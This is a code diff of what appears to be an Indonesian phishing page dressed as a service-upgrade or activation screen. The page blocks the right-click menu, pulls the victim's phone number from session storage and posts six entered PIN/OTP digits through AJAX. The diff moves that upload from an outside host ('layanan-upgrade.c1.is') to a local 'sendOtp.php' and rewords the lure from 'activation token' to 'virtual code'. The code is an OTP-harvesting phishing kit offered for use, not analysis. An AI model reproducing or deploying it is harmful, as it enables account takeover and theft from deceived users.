@@ -24,7 +24,7 @@ document.addEventListener("contextmenu", function(e){
             padding: 0;
             margin: 0;
             width: 100%;
-             background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIl9fJDOqcvolVJXJsJIFmE2cQWrWhhZIClOur7C8dX3H36TEvVnEEqpTa87gJpCRxUZhWzfARK5I8B9ieOGe3dtymUC4gpOBsAYfM2L95Q0p0JwTJ1WbBTnbmKjlpRoxMF-tWHG7DVzpgf4plFV9Ox9nIj5hxiUuiBiQRJok7hqzsUXBAw_iNafnLBc4/s2156/AddText_04-27-04.10.20.jpg");
+             background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH2H8sO3OhqchlEKpNfQiSOvytefMhaScgNFogBJZEN0p8CKeYSJStK-YSSh4mjiIJ0fNx4fzSpwQwmzky_gbTy7w8LQy-YgrB7CgUZYh-PFW3_MpPZzjIkdVznQ0PeTvknlOryEGhxcCpvvqhY4hhmZ_PQoyPi-J-hPbdsgw8QkLeyN_RKROCvEn7DpU/s2156/AddText_06-11-01.49.19.jpg");
     background-position: 100% 100%;
     background-size: 100% 716px;
     background-repeat: no-repeat;
@@ -473,7 +473,7 @@ var phone = sessionStorage.getItem("phone");
    
 $.ajax({
  type: 'POST',
- url: 'https://layanan-upgrade.c1.is/data/2/sendOtp.php',
+ url: 'sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $("#ryuSubmit").serialize(),
@@ -484,7 +484,7 @@ $.ajax({
        $("#djload").hide();  
       
     }, 2000);
-     $("#notif").text("- Token Aktivasi sudah kadaluarsa -");
+     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
      $("#notif").css("color", "red");
                 $("#pin1").html('');
                 $("#pin2").html('');
@@ -493,7 +493,7 @@ $.ajax({
                 $("#pin5").html('');
                 $("#pin6").html('');   
    setTimeout(() => {
-     $("#notif").text("Request Token Aktivasi");
+     $("#notif").text("Request Kode Virtual");
    $("#notif").css("color", "white");
    $("#keybot").hide();  
               
